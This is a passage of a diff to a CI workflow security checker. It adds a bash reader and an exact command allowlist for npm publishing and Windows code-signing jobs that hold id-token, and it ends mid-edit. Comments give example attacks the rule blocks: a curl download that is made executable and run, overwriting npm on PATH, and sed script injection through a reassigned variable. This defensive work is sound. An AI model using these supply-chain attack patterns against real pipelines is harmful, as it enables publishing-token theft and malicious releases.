@@ -78,6 +78,15 @@
 #      a write scope or a secret is held either; the webview PR job takes from
 #      its artifact exactly the vendored tree, hidden files included, and no
 #      link and no .git (that step executed against hostile fixtures).
+#   9. (#1029) The two npm publishing jobs, publish-brain and publish-sidecar,
+#      and every other job holding id-token (the two Windows signers), run
+#      only the commands listed for them: each run: is read as bash, every
+#      command found (substitutions included) must be on the job list, the
+#      ones that can fetch, write, run a program or load code only in their
+#      listed text, every assignment, function call, array and for list
+#      as listed, no write by redirection but to /dev/null, $GITHUB_OUTPUT
+#      or another descriptor, and the list is exactly what the jobs run. A
+#      job holding id-token with no list fails. See runAllow.
 #
 # Each rule is also run against a mutated copy that breaks it, and must report
 # it, so a neutered check fails here instead of passing everything.
@@ -110,6 +119,7 @@ trap 'rm -rf "$WORK"' EXIT
 # check <rule> <file>: one violation per line, nothing when clean.
 #   rule = scoped | publish-perms | pinned | authority | reach | untrusted
 #          | mutable | narrow | pushcache | opens-pr | catalog-pr | npmpin
+#          | runs
 check() {
 	# shellcheck disable=SC2016 # JavaScript source, not shell: nothing should expand.
 	RULE="$1" FILE="$2" REPO="${REPO_DIR:-${HERE}/../..}" bun -e '
@@ -144,6 +154,581 @@ const flatSteps = (steps, via = "", depth = 0) => {
   }
   return outSteps;
 };
+// shRead(src): the simple commands of a bash script, as this rule reads them.
+// Returns { cmds: [{ name, words, redirs, assigns }], funcs, arrays, unread }.
+// A substitution ($( ), backticks, <( ), >( )) is read as a script of its own
+// wherever it sits, in a word, a [[ ]], a case pattern or a for list, so the
+// commands inside always count. Anything outside the subset read here is
+// listed in unread, and the rule refuses it rather than guess.
+const shRead = (src) => {
+  const cmds = [], funcs = [], arrays = [], fors = [], unread = [];
+  const n = src.length;
+  let i = 0;
+  const sp = (c) => c === " " || c === "\t";
+  const take = (r) => { cmds.push(...r.cmds); funcs.push(...r.funcs); arrays.push(...r.arrays); fors.push(...r.fors); unread.push(...r.unread); };
+  // From just after an opener to its closer; the inside read as a script.
+  const sub = (closer) => {
+    const start = i;
+    let depth = 0, q = "";
+    for (; i < n; i++) {
+      const c = src[i];
+      if (q === "\x27") { if (c === "\x27") q = ""; continue; }
+      if (q === "a") { if (c === "\\") i++; else if (c === "\x27") q = ""; continue; }
+      if (c === "\\") { i++; continue; }
+      if (q === "\"") { if (c === "\"") q = ""; continue; }
+      if (c === "$" && src[i + 1] === "\x27") { q = "a"; i++; continue; }
+      if (c === "\x27" || c === "\"") { q = c; continue; }
+      if (c === "#" && closer === ")" && (i === start || /[\s;&|(]/.test(src[i - 1]))) { unread.push("a comment inside a substitution"); continue; }
+      if (closer === "`") { if (c === "`") break; continue; }
+      if (c === "(") depth++;
+      else if (c === ")") { if (depth === 0) break; depth--; }
+    }
+    if (i >= n) { unread.push("an unclosed substitution"); return; }
+    take(shRead(src.slice(start, i)));
+    i++;
+  };
+  // ${...}: only the forms that evaluate no arithmetic and take no subscript
+  // but a literal one.
+  const param = () => {
+    const start = i;
+    let depth = 1, q = "";
+    for (; i < n; i++) {
+      const c = src[i];
+      if (q === "\x27") { if (c === "\x27") q = ""; continue; }
+      if (c === "\\") { i++; continue; }
+      if (c === "$" && src[i + 1] === "(" && src[i + 2] !== "(") { i += 2; sub(")"); i--; continue; }
+      if (c === "`") { i++; sub("`"); i--; continue; }
+      if (q === "\"") { if (c === "\"") q = ""; continue; }
+      if (c === "\x27" || c === "\"") { q = c; continue; }
+      if (c === "{") depth++;
+      else if (c === "}" && --depth === 0) break;
+    }
+    if (i >= n) { unread.push("an unclosed ${"); return; }
+    const body = src.slice(start, i);
+    i++;
+    const m = /^#?(?:[A-Za-z_][A-Za-z0-9_]*|[0-9]+|[@*#?$!-])(?:\[(?:[0-9]+|@|\*)\])?([\s\S]*)$/.exec(body);
+    if (!m || (m[1] !== "" && !/^(?::?[-=+?]|##?|%%?|\/\/?)/.test(m[1])))
+      unread.push("the parameter expansion ${" + body + "} (a subscript, a substring or an indirection)");
+  };
+  // One word, as written, quotes kept.
+  const word = () => {
+    const start = i;
+    let q = "";
+    for (; i < n; i++) {
+      const c = src[i];
+      if (q === "\x27") { if (c === "\x27") q = ""; continue; }
+      if (q === "a") { if (c === "\\") i++; else if (c === "\x27") q = ""; continue; }
+      if (c === "\\") { i++; continue; }
+      if (c === "$" && src.startsWith("((", i + 1)) { unread.push("an arithmetic expansion"); i += 2; continue; }
+      if (c === "$" && src[i + 1] === "(") { i += 2; sub(")"); i--; continue; }
+      if (c === "$" && src[i + 1] === "{") { i += 2; param(); i--; continue; }
+      if (c === "`") { i++; sub("`"); i--; continue; }
+      if (q === "\"") { if (c === "\"") q = ""; continue; }
+      if (c === "$" && src[i + 1] === "\x27") { q = "a"; i++; continue; }
+      if (c === "\x27" || c === "\"") { q = c; continue; }
+      if ((c === "<" || c === ">") && src[i + 1] === "(") { i += 2; sub(")"); i--; continue; }
+      if (c === "=" && src[i + 1] === "(" && /^[A-Za-z_][A-Za-z0-9_]*\+?$/.test(src.slice(start, i))) {
+        // An array literal: NAME=( ... ) or NAME+=( ... ), its items kept.
+        const name = src.slice(start, i).replace(/\+$/, "");
+        i += 2;
+        const at = i;
+        let depth = 0;
+        for (; i < n && !(src[i] === ")" && depth === 0); i++) {
+          if (src[i] === "(") depth++;
+          else if (src[i] === ")") depth--;
+          else if (/[$`\x27"\\]/.test(src[i])) unread.push("an array literal holding quotes or expansions");
+        }
+        arrays.push({ name, items: src.slice(at, i).trim().split(/\s+/).filter(Boolean) });
+        continue;
+      }
+      if (sp(c) || c === "\n" || ";&|()<>".includes(c)) break;
+    }
+    if (q) unread.push("an unclosed quote");
+    return src.slice(start, i);
+  };
+  const toks = [];
+  while (i < n) {
+    const c = src[i];
+    if (sp(c)) { i++; continue; }
+    if (c === "\\" && src[i + 1] === "\n") { i += 2; continue; }
+    if (c === "#") { while (i < n && src[i] !== "\n") i++; continue; }
+    if (c === "\n") { toks.push({ op: ";" }); i++; continue; }
+    const two = src.slice(i, i + 2), three = src.slice(i, i + 3);
+    if (three === "<<<" || three === "&>>" || three === ";;&") { toks.push({ op: three }); i += 3; continue; }
+    if (two === "<<") { unread.push("a heredoc"); i += 2; continue; }
+    if (two === "((") { unread.push("an arithmetic command"); i += 2; continue; }
+    if ((c === "<" || c === ">") && src[i + 1] === "(") { toks.push({ w: word() }); continue; }
+    if (["&&", "||", ";;", ";&", "|&", ">>", ">&", "<&", "&>", ">|", "<>"].includes(two)) { toks.push({ op: two }); i += 2; continue; }
+    if (";&|()<>".includes(c)) { toks.push({ op: c }); i++; continue; }
+    if (two === "[[" && (i + 2 >= n || sp(src[i + 2]))) {
+      // Read whole: a regex there holds ( ) | unquoted.
+      i += 2;
+      const start = i;
+      let q = "";
+      for (; i < n; i++) {
+        const d = src[i];
+        if (q === "\x27") { if (d === "\x27") q = ""; continue; }
+        if (q === "a") { if (d === "\\") i++; else if (d === "\x27") q = ""; continue; }
+        if (d === "\\") { i++; continue; }
+        if (d === "$" && src[i + 1] === "(" && src[i + 2] !== "(") { i += 2; sub(")"); i--; continue; }
+        if (d === "$" && src[i + 1] === "{") { i += 2; param(); i--; continue; }
+        if (d === "`") { i++; sub("`"); i--; continue; }
+        if (q === "\"") { if (d === "\"") q = ""; continue; }
+        if (d === "$" && src[i + 1] === "\x27") { q = "a"; i++; continue; }
+        if (d === "\x27" || d === "\"") { q = d; continue; }
+        if (d === "\n") { unread.push("a [[ ]] across lines"); break; }
+        if (d === "]" && src[i + 1] === "]" && sp(src[i - 1]) && (i + 2 >= n || /[\s;&|)]/.test(src[i + 2]))) break;
+      }
+      if (i >= n || src[i] !== "]") unread.push("an unclosed [[");
+      const body = src.slice(start, i);
+      // An integer comparison there evaluates its operands as arithmetic,
+      // which runs a $( ) that an operand only spells, even quoted.
+      if (/(?:^|\s)-(?:eq|ne|lt|le|gt|ge)(?=\s|$)/.test(body)) unread.push("an integer comparison inside [[ ]]");
+      toks.push({ cond: body });
+      i += 2;
+      continue;
+    }
+    const fd = /^[0-9]+(?=[<>])/.exec(src.slice(i, i + 4));
+    if (fd) { i += fd[0].length; continue; }
+    toks.push({ w: word() });
+  }
+  // Commands from the tokens.
+  const reserved = new Set(["if", "then", "elif", "else", "fi", "do", "done", "while", "until", "!", "{", "}"]);
+  const refused = new Set(["select", "coproc", "time", "function", "let", "in", "esac", "[[", "]]", "eval", "source", "."]);
+  const sep = new Set([";", "&", "&&", "||", "|", "|&", "(", ")"]);
+  const redirOps = new Set([">", ">>", ">|", "&>", "&>>", "<>", ">&", "<", "<<<", "<&"]);
+  const cases = [];
+  let t = 0;
+  while (t < toks.length) {
+    const k = toks[t];
+    const top = cases[cases.length - 1];
+    if (top === "pattern") {
+      if (k.op === ";") { t++; continue; }
+      if (k.w === "esac") { cases.pop(); t++; continue; }
+      if (k.op === "(") t++;
+      while (t < toks.length && toks[t].op !== ")") t++;
+      t++;
+      cases[cases.length - 1] = "body";
+      continue;
+    }
+    if (top === "body" && (k.op === ";;" || k.op === ";&" || k.op === ";;&")) { cases[cases.length - 1] = "pattern"; t++; continue; }
+    if (top === "body" && k.w === "esac") { cases.pop(); t++; continue; }
+    if (k.op && sep.has(k.op)) { t++; continue; }
+    if (k.op === ";;" || k.op === ";&" || k.op === ";;&") { unread.push("a case terminator outside a case"); t++; continue; }
+    if (k.cond !== undefined) { t++; continue; }
+    if (k.w !== undefined && reserved.has(k.w)) { t++; continue; }
+    if (k.w === "for") {
+      if (!/^[A-Za-z_][A-Za-z0-9_]*$/.test(toks[t + 1]?.w ?? "") || toks[t + 2]?.w !== "in") { unread.push("a for loop of another shape"); t++; continue; }
+      const v = toks[t + 1].w;
+      t += 3;
+      const items = [];
+      while (t < toks.length && toks[t].op !== ";") { if (toks[t].w === undefined) unread.push("a for list holding an operator"); else items.push(toks[t].w); t++; }
+      fors.push({ v, items });
+      continue;
+    }
+    if (k.w === "case") {
+      if (toks[t + 1]?.w === undefined || toks[t + 2]?.w !== "in") { unread.push("a case of another shape"); t++; continue; }
+      cases.push("pattern");
+      t += 3;
+      continue;
+    }
+    if (k.w !== undefined && toks[t + 1]?.op === "(" && toks[t + 2]?.op === ")") { funcs.push(k.w); t += 3; continue; }
+    // A simple command: assignments, redirections, then a name and words.
+    const c = { name: null, words: [], redirs: [], assigns: [] };
+    while (t < toks.length && !(toks[t].op && (sep.has(toks[t].op) || toks[t].op.startsWith(";")))) {
+      const x = toks[t];
+      if (top === "body" && x.w === "esac" && c.name === null) break;
+      if (x.op && redirOps.has(x.op)) {
+        if (toks[t + 1]?.w === undefined) unread.push("a redirection with no target");
+        c.redirs.push({ op: x.op, target: toks[t + 1]?.w ?? "" });
+        t += 2;
+        continue;
+      }
+      if (x.cond !== undefined) { unread.push("a [[ ]] inside a command"); t++; continue; }
+      if (x.op) { unread.push("the operator " + x.op); t++; continue; }
+      if (c.name === null && /^[A-Za-z_][A-Za-z0-9_]*\+?=/.test(x.w)) { c.assigns.push(x.w); t++; continue; }
+      if (c.name === null && refused.has(x.w)) unread.push("the shell word " + x.w);
+      if (c.name === null) c.name = x.w; else c.words.push(x.w);
+      t++;
+    }
+    // A bare assignment is kept too: its value reaches the commands after it.
+    if (c.name !== null || c.redirs.length || c.assigns.length) cmds.push(c);
+  }
+  if (cases.length) unread.push("an unclosed case");
+  return { cmds, funcs, arrays, fors, unread };
+};
+if (rule === "runs") {
+  // #1029: the commands the two npm publishing jobs run are listed, not the
+  // ones they must not run, and (security review of #1029) so are those of
+  // every other job holding id-token: today the two Windows signers, which
+  // federate into the KMS signing key. narrow refuses runtimes and package managers,
+  // and that list could never be complete: `curl -o /tmp/x URL; chmod +x
+  // /tmp/x; /tmp/x` passed it in the one job that mints an npm publish
+  // token. Here a new command in either job fails until it is added below,
+  // with a reason, the way their uses: and their env names (knownEnv) are.
+  //
+  // How a command is identified. Each run: is read as bash by shRead: words
+  // and quotes as bash splits them; commands split at newlines, ; & && ||
+  // | |& and ( ), and found after if then elif else while until do ! { };
+  // assignments in front skipped; the patterns of a case and the list of a
+  // for read as data; and every $( ), backtick, <( ) and >( ), wherever it
+  // sits (in a word, a quote, a [[ ]], a pattern, a for list, an array
+  // subscript), read as a script of its own, so a command inside one is a
+  // command. The name is the first word after that. A construct shRead does
+  // not read (a heredoc, arithmetic, an integer test in [[ ]], a subscript
+  // or substring that evaluates arithmetic, select, coproc, time, eval,
+  // source, a comment inside a substitution) is refused rather than guessed.
+  //
+  // Then, for each command:
+  //   - its name is a plain word (not a path, not an expansion) unless it is
+  //     a listed form (scripts/sign-windows.sh, whose own text is repository
+  //     content, like the package.json scripts below), so nothing
+  //     downloaded or written can be run by its path, and is on the list:
+  //     free (any arguments: it can neither fetch, write a file it is given,
+  //     run another program nor load code by an option) or pinned (its whole
+  //     text, name and words as written, is one of the listed forms: curl
+  //     fetches and writes, openssl loads engines, tar and cp and tee write,
+  //     sed and find and xargs and sort run programs, npm and set and export
+  //     and cd change what runs next). Without the pin, curl -o over the npm
+  //     on PATH, then the allowed npm publish, is the same attack;
+  //   - nothing is put in front of it but LC_ALL=C;
+  //   - it writes by redirection only to /dev/null, $GITHUB_OUTPUT or
+  //     another descriptor;
+  //   - printf takes no -v, which assigns a variable unseen.
+  // Functions are listed too, may not take the name of a command, and are
+  // called only in the step that defines them (a binary of that name, expect
+  // for one, may be on PATH), and each call only as listed, since its
+  // arguments reach the forms inside it. Every assignment (a bare one, as
+  // written), array literal and for list is listed too, since their values
+  // reach the pinned forms (review of #1029: a VERSION reassigned before the
+  // pinned sed -i would hand sed a script of its own, and GNU sed scripts
+  // run commands).
+  // And the list is exactly what the jobs run: an entry no step uses is
+  // reported, so nothing stays allowed after the step that needed it went.
+  //
+  // Not covered: the values a step takes from its env: (job outputs and
+  // inputs, which the scripts check before use, #684, #781) and from the
+  // runner reach the listed forms as they come; a redirection to
+  // "$GITHUB_OUTPUT" is matched as that text, which holds because narrow
+  // refuses any GITHUB_* name being set; and npm runs lifecycle scripts of
+  // the package.json in a directory it publishes or versions
+  // (publish-sidecar), which is repository content, not run: text.
+  const runAllow = {
+    "publish-brain": {
+      free: ["[", "base64", "echo", "exit", "sha256sum"],
+      pinned: {
+        curl: [
+          "curl -fsS --proto \x27=https\x27 --retry 3 --max-time 300 --max-filesize 67108864 -o \"$npm_tgz\" \"https://registry.npmjs.org/npm/-/npm-${NPM_VERSION}.tgz\"",
+        ],
+        mktemp: [
+          "mktemp -d /tmp/npm.XXXXXXXXXX",
+        ],
+        npm: [
+          "npm --version",
+          "npm install -g --offline --ignore-scripts \"$npm_tgz\"",
+          "npm publish \"${RUNNER_TEMP}/brain-pack/${TARBALL}\" --access public \"${flags[@]}\"",
+          "npm view \"${pkg}@${VERSION}\" version",
+        ],
+        openssl: [
+          "openssl dgst -sha512 -binary \"$npm_tgz\"",
+        ],
+        set: [
+          "set -euo pipefail",
+        ],
+      },
+      funcs: [],
+      arrays: ["flags=()", "flags=(--dry-run)", "flags=(--tag next)"],
+      fors: [],
+      calls: [
+      ],
+      assigns: [
+        "got=\"$(npm --version)\"",
+        "got=\"sha512-$(openssl dgst -sha512 -binary \"$npm_tgz\" | base64 -w0)\"",
+        "npm_tgz=\"$(mktemp -d /tmp/npm.XXXXXXXXXX)/npm-${NPM_VERSION}.tgz\"",
+        "pkg=\"@usejarvis/brain\"",
+      ],
+    },
+    "publish-sidecar": {
+      free: ["[", "base64", "cut", "echo", "exit", "grep", "mkdir", "printf", "return", "sha256sum", "true"],
+      pinned: {
+        cd: [
+          "cd \"$GITHUB_WORKSPACE\"",
+          "cd \"${pkg_dir}\"",
+          "cd \"sidecar/npm/${platform}\"",
+          "cd -P \"$1\"",
+          "cd artifacts",
+          "cd sidecar/npm/jarvis-sidecar",
+        ],
+        chmod: [
+          "chmod +x \"${pkg_dir}/bin/\"*",
+        ],
+        cp: [
+          "cp \"artifacts/sidecar-${platform}/\"* \"${pkg_dir}/bin/\"",
+        ],
+        curl: [
+          "curl -fsS --proto \x27=https\x27 --retry 3 --max-time 300 --max-filesize 67108864 -o \"$npm_tgz\" \"https://registry.npmjs.org/npm/-/npm-${NPM_VERSION}.tgz\"",
+          "curl -fsSL --proto \x27=https\x27 --retry 3 --max-time 300 --max-filesize 268435456 -o \"${tmp}/npm.tgz\" \"$url\"",
+        ],
+        diff: [
+          "diff <(printf \x27%s\\n\x27 \"$ours\") <(printf \x27%s\\n\x27 \"$theirs\")",
+          "diff <(printf \x27%s\\n\x27 \"$want\") <(printf \x27%s\\n\x27 \"$got\")",
+        ],
+        export: [
+          "export LC_ALL=C",
+        ],
+        find: [
+          "find \"${tmp}/x\" -mindepth 1 -maxdepth 1 -printf \x27%P %y\\n\x27",
+          "find . -mindepth 1 -not -type d",
+          "find . -mindepth 1 -not -type d -not -type f -print -quit",
+          "find . -mindepth 1 -not -type d -printf \x27%y %P\\n\x27",
+          "find . -name \x27*[![:print:]]*\x27 -print -quit",
+          "find . -type f -print0",
+          "find bin -type f -print -quit",
+        ],
+        local: [
+          "local url integrity tmp got names types ours theirs",
+        ],
+        mktemp: [
+          "mktemp",
+          "mktemp -d",
+          "mktemp -d /tmp/npm.XXXXXXXXXX",
+        ],
+        npm: [
+          "npm --version",
+          "npm install -g --offline --ignore-scripts \"$npm_tgz\"",
+          "npm publish --access public \"${flags[@]}\"",
+          "npm version \"${VERSION}\" --no-git-tag-version --allow-same-version",
+          "npm view \"${1}@${VERSION}\" dist.integrity",
+          "npm view \"${1}@${VERSION}\" dist.tarball",
+          "npm view \"${pkg}@${VERSION}\" version",
+        ],
+        openssl: [
+          "openssl dgst -sha512 -binary \"$npm_tgz\"",
+          "openssl dgst -sha512 -binary \"${tmp}/npm.tgz\"",
+        ],
+        sed: [
+          "sed \x27s|^\\./||\x27",
+          "sed -i \"s|\\\"@usejarvis/sidecar-${platform}\\\": \\\".*\\\"|\\\"@usejarvis/sidecar-${platform}\\\": \\\"${VERSION}\\\"|\" package.json",
+        ],
+        set: [
+          "set -euo pipefail",
+          "set -o pipefail",
+        ],
+        sort: [
+          "sort",
+          "sort -z",
+        ],
+        tar: [
+          "tar --quoting-style=escape -tvzf \"${tmp}/npm.tgz\"",
+          "tar --quoting-style=escape -tzf \"${tmp}/npm.tgz\"",
+          "tar -xzf \"${tmp}/npm.tgz\" -C \"${tmp}/x\" --no-same-owner --no-same-permissions",
+          "tar -xzf \"artifacts/sidecar-${platform}/jarvis-app.tar.gz\" -C \"${pkg_dir}/bin/\"",
+        ],
+        tee: [
+          "tee \"$err\"",
+        ],
+        xargs: [
+          "xargs -0 -r sha256sum",
+          "xargs -0 sha256sum",
+        ],
+      },
+      funcs: ["expect", "manifest", "same_as_npm"],
+      arrays: ["flags=()", "flags=(--dry-run)", "flags=(--tag next)"],
+      fors: ["platform in darwin-arm64 darwin-x64 linux-x64 linux-arm64 win32-x64"],
+      calls: [
+        "expect \"$SHA_DARWIN_ARM64\" \"sidecar-darwin-arm64/jarvis-app.tar.gz\"",
+        "expect \"$SHA_DARWIN_X64\" \"sidecar-darwin-x64/jarvis-app.tar.gz\"",
+        "expect \"$SHA_LINUX_ARM64\" \"sidecar-linux-arm64/${SIDECAR_BIN}\"",
+        "expect \"$SHA_LINUX_X64\" \"sidecar-linux-x64/${SIDECAR_BIN}\"",
+        "expect \"$SHA_WIN32_X64\" \"sidecar-win32-x64/${SIDECAR_BIN}.exe\"",
+        "manifest \"${tmp}/x/package\"",
+        "manifest .",
+        "same_as_npm \"$pkg\"",
+      ],
+      assigns: [
+        "SHA_DARWIN_ARM64=\"${BASH_REMATCH[3]}\"",
+        "SHA_DARWIN_X64=\"${BASH_REMATCH[4]}\"",
+        "SHA_LINUX_ARM64=\"${BASH_REMATCH[2]}\"",
+        "SHA_LINUX_X64=\"${BASH_REMATCH[1]}\"",
+        "SHA_WIN32_X64=\"${BASH_REMATCH[5]}\"",
+        "VERSION=\"${BUILT_VERSION:-}\"",
+        "VERSION=\"${GIVEN_VERSION:-}\"",
+        "err=\"$(mktemp)\"",
+        "got=\"$(find . -mindepth 1 -not -type d | sed \x27s|^\\./||\x27 | sort)\"",
+        "got=\"$(npm --version)\"",
+        "got=\"$(openssl dgst -sha512 -binary \"${tmp}/npm.tgz\" | base64 -w0)\"",
+        "got=\"sha512-$(openssl dgst -sha512 -binary \"$npm_tgz\" | base64 -w0)\"",
+        "h=\x27([0-9a-f]{64})\x27",
+        "id=\x27(0|[1-9][0-9]*|[0-9]*[A-Za-z-][0-9A-Za-z-]*)\x27",
+        "integrity=\"$(npm view \"${1}@${VERSION}\" dist.integrity)\"",
+        "manifest+=\"$1  $2\"$\x27\\n\x27",
+        "manifest=\"\"",
+        "names=\"$(tar --quoting-style=escape -tzf \"${tmp}/npm.tgz\")\"",
+        "npm_tgz=\"$(mktemp -d /tmp/npm.XXXXXXXXXX)/npm-${NPM_VERSION}.tgz\"",
+        "ours=\"$(manifest .)\"",
+        "pkg=\"@usejarvis/sidecar\"",
+        "pkg=\"@usejarvis/sidecar-${platform}\"",
+        "pkg_dir=\"sidecar/npm/${platform}\"",
+        "re=\"^linux-x64=${h} linux-arm64=${h} darwin-arm64=${h} darwin-x64=${h} win32-x64=${h}\\$\"",
+        "same=$?",
+        "same=0",
+        "sums=\"$(cd artifacts && find . -type f -print0 | LC_ALL=C sort -z | xargs -0 sha256sum | base64 -w0)\"",
+        "theirs=\"$(manifest \"${tmp}/x/package\")\"",
+        "tmp=\"$(mktemp -d)\"",
+        "types=\"$(tar --quoting-style=escape -tvzf \"${tmp}/npm.tgz\" | cut -c1)\"",
+        "url=\"$(npm view \"${1}@${VERSION}\" dist.tarball)\"",
+        "want=\"$(printf \x27%s\x27 \"$manifest\" | cut -d\x27 \x27 -f3- | sort)\"",
+      ],
+    },
+    "sign-sidecar-windows": {
+      free: ["[", "cut", "echo", "exit", "sha256sum"],
+      pinned: {
+        find: [
+          "find \"$in\" -mindepth 1 -print",
+        ],
+        install: [
+          "install -m 0644 \"${in}/${SIDECAR_BIN}.exe\" \"${SIDECAR_BIN}.exe\"",
+        ],
+        "scripts/sign-windows.sh": [
+          "scripts/sign-windows.sh --defer-verify \"${SIDECAR_BIN}.exe\"",
+        ],
+        set: [
+          "set -euo pipefail",
+        ],
+      },
+      funcs: [],
+      arrays: [],
+      fors: [],
+      calls: [
+      ],
+      assigns: [
+        "fix=\"Issue the certificate and commit sidecar/packaging/windows/codesign-chain.pem\"",
+        "fix=\"Set the GCP_KMS_KEYRING repository variable\"",
+        "in=\"${RUNNER_TEMP}/unsigned\"",
+        "missing=\"\"",
+        "missing=\"GCP_KMS_KEYRING is set but sidecar/packaging/windows/codesign-chain.pem is missing -- the certificate has not been issued/committed yet\"",
+        "missing=\"Windows signing is not configured (GCP_KMS_KEYRING unset)\"",
+      ],
+    },
+    "sign-windows": {
+      free: ["[", "cut", "echo", "exit", "sha256sum"],
+      pinned: {
+        find: [
+          "find \"$in\" -mindepth 1 -print",
+        ],
+        install: [
+          "install -m 0644 \"${in}/Jarvis-Setup.exe\" Jarvis-Setup.exe",
+        ],
+        "scripts/sign-windows.sh": [
+          "scripts/sign-windows.sh --defer-verify Jarvis-Setup.exe",
+        ],
+        set: [
+          "set -euo pipefail",
+        ],
+      },
+      funcs: [],
+      arrays: [],
+      fors: [],
+      calls: [
+      ],
+      assigns: [
+        "fix=\"Issue the certificate and commit sidecar/packaging/windows/codesign-chain.pem\"",
+        "fix=\"Set the GCP_KMS_KEYRING repository variable\"",
+        "in=\"${RUNNER_TEMP}/unsigned\"",
+        "missing=\"\"",
+        "missing=\"GCP_KMS_KEYRING is set but sidecar/packaging/windows/codesign-chain.pem is missing -- the certificate has not been issued/committed yet\"",
+        "missing=\"Windows signing is not configured (GCP_KMS_KEYRING unset)\"",
+      ],
+    },
+  };
+  const writesOidc = (perm) => perm === "write-all" || (perm && typeof perm === "object" && perm["id-token"] === "write");
+  const outOps = new Set([">", ">>", ">|", "&>", "&>>", "<>"]);
+  for (const [name, job] of Object.entries(jobs)) {
+    if (typeof job.uses === "string") continue;
+    const steps = flatSteps(job.steps);
+    const allText = steps.map(({ st }) => typeof st.run === "string" ? st.run : "").join("\n");
+    const allow = Object.hasOwn(runAllow, name) ? runAllow[name] : null;
+    // Every job holding id-token has a list, whatever it runs: one that
+    // only had to when it ran npm publish let an added job, or a signer,
+    // download and run anything (security review of #1029).
+    if (!allow) {
+      if (writesOidc(job.permissions ?? doc.permissions))
+        out.push(name + ": holds id-token and has no list of the commands it may run (#1029): add one to runAllow");
+      continue;
+    }
+    if (process.env.RUNS_REPORT) out.push("checked " + name);
+    const listed = new Set([...allow.free, ...Object.keys(allow.pinned)]);
+    for (const f of allow.funcs) if (listed.has(f)) out.push(name + ": runAllow lists " + f + " as a function and as a command");
+    const used = { free: new Set(), forms: new Set(), funcs: new Set(), arrays: new Set(), fors: new Set(), calls: new Set(), assigns: new Set() };
+    const plainShell = ["bash", "bash -e {0}", "bash --noprofile --norc -eo pipefail {0}"];
+    for (const [i, { st, via }] of steps.entries()) {
+      if (typeof st.run !== "string") continue;
+      const label = name + ": step " + (via ? "(via " + via.slice(0, -3) + ") " : "") + (st.name ?? st.id ?? st.uses ?? String(i));
+      // shRead reads bash, so the step must run in bash.
+      const sh = st.shell ?? job.defaults?.run?.shell ?? doc.defaults?.run?.shell;
+      if (sh !== undefined && !plainShell.includes(String(sh).trim())) out.push(label + " runs in shell: " + sh + ", which this rule does not read (#1029)");
+      const r = shRead(st.run);
+      for (const u of r.unread) out.push(label + " holds " + u + ", which this rule does not read (#1029)");
+      for (const f of r.funcs) {
+        used.funcs.add(f);
+        if (listed.has(f)) out.push(label + " defines a function " + f + " over a command (#1029)");
+        else if (!allow.funcs.includes(f)) out.push(label + " defines a function " + f + ", which is not on the " + name + " list (#1029)");
+      }
+      for (const a of r.arrays) {
+        const key = a.name + "=(" + a.items.join(" ") + ")";
+        used.arrays.add(key);
+        if (!allow.arrays.includes(key)) out.push(label + " sets the array " + key + ", which is not on the " + name + " list (#1029)");
+      }
+      for (const fl of r.fors) {
+        const key = fl.v + " in " + fl.items.join(" ");
+        used.fors.add(key);
+        if (!allow.fors.includes(key)) out.push(label + " loops over " + key + ", which is not on the " + name + " list (#1029)");
+      }
+      for (const c of r.cmds) {
+        for (const rd of c.redirs)
+          if ((outOps.has(rd.op) && rd.target !== "/dev/null" && rd.target !== "\"$GITHUB_OUTPUT\"") ||
+              ((rd.op === ">&" || rd.op === "<&") && !/^(?:[0-9]+|-)$/.test(rd.target)))
+            out.push(label + " writes to " + rd.target + " (only /dev/null, $GITHUB_OUTPUT or another descriptor) (#1029)");
+        if (c.name === null) {
+          for (const a of c.assigns) {
+            if (/^[A-Za-z_][A-Za-z0-9_]*\+?=\(/.test(a)) continue;
+            used.assigns.add(a);
+            if (!allow.assigns.includes(a)) out.push(label + " assigns " + JSON.stringify(a) + ", which is not on the " + name + " list (#1029)");
+          }
+          continue;
+        }
+        for (const a of c.assigns) if (a !== "LC_ALL=C") out.push(label + " runs " + c.name + " with " + a + " in front, where only LC_ALL=C may go (#1029)");
+        if (!Object.hasOwn(allow.pinned, c.name) && !/^(?:[A-Za-z_][A-Za-z0-9_.-]*|\[)$/.test(c.name)) {
+          out.push(label + " runs " + c.name + ", which is not a plain command name this rule can check (a path or an expansion) (#1029)");
+          continue;
+        }
+        if (r.funcs.includes(c.name)) {
+          const call = [c.name, ...c.words].join(" ");
+          used.calls.add(call);
+          if (!allow.calls.includes(call)) out.push(label + " calls " + JSON.stringify(call) + ", which is not one of the calls listed (#1029)");
+          continue;
+        }
+        if (allow.funcs.includes(c.name)) { out.push(label + " calls " + c.name + ", a function this step does not define (#1029)"); continue; }
+        const form = [c.name, ...c.words].join(" ");
+        if (Object.hasOwn(allow.pinned, c.name)) {
+          used.forms.add(form);
+          if (!allow.pinned[c.name].includes(form)) out.push(label + " runs " + JSON.stringify(form) + ", which is not one of the forms listed for " + c.name + " (#1029)");
+        } else if (allow.free.includes(c.name)) used.free.add(c.name);
+        else out.push(label + " runs " + c.name + ", which is not on the " + name + " list (#1029)");
+        if (c.name === "printf" && c.words.some((w) => /^-v/.test(w))) out.push(label + " runs printf -v, which sets a variable this rule cannot see (#1029)");
+      }
+    }
+    // Exactly what the job runs: nothing listed that no step uses.
+    const stale = (kind, x) => out.push(name + ": runAllow lists the " + kind + " " + JSON.stringify(x) + ", which no step of the job runs any more: remove it (#1029)");
+    for (const x of allow.free) if (!used.free.has(x)) stale("command", x);
+    for (const forms of Object.values(allow.pinned)) for (const f of forms) if (!used.forms.has(f)) stale("form", f);
+    for (const x of allow.funcs) if (!used.funcs.has(x)) stale("function", x);
+    for (const x of allow.arrays) if (!used.arrays.has(x)) stale("array", x);
+    for (const x of allow.fors) if (!used.fors.has(x)) stale("for list", x);
+    for (const x of allow.calls) if (!used.calls.has(x)) stale("call", x);
+    for (const x of allow.assigns) if (!used.assigns.has(x)) stale("assignment", x);
+  }
+}
 if (rule === "scoped" && doc.permissions === undefined)
   for (const [name, job] of Object.entries(jobs))
     if (job.permissions === undefined)
@@ -1155,13 +1740,18 @@ expect_caught() {
 const s = await Bun.file(process.env.FROM).text();
 const n = s.split(process.env.OLD).length - 1;
 if (n < 1) { console.error("anchor not found"); process.exit(2); }
-await Bun.write(process.env.TO, s.replace(process.env.OLD, process.env.NEW));
+await Bun.write(process.env.TO, s.replace(process.env.OLD, () => process.env.NEW));
 '; then
 		no "mutant '$1' could be applied (the workflow no longer has the text it mutates)"
 		return
 	fi
 	local found
-	found="$(check "$2" "$copy")"
+	# A mutant the check cannot read (a YAML error) proves nothing, and used
+	# to read as "passed" (#1029 found one, mangled by a $ in the replacement).
+	found="$(check "$2" "$copy")" || {
